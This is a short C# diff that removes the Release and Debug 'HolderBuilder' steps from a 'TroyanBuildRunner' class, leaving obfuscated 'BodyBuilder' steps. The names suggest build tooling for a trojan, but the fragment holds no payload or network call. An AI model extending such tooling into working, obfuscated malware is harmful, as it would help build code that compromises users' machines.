@@ -22,8 +22,6 @@ public sealed class TroyanBuildRunner : ITroyanBuildRunner
         {
             new BodyBuilder(TroyanBuildMode.Release, _obfuscator),
             new BodyBuilder(TroyanBuildMode.Debug, _obfuscator),
-            new HolderBuilder(TroyanBuildMode.Release, _obfuscator),
-            new HolderBuilder(TroyanBuildMode.Debug, _obfuscator),
         };
 
         foreach (var cb in steps)
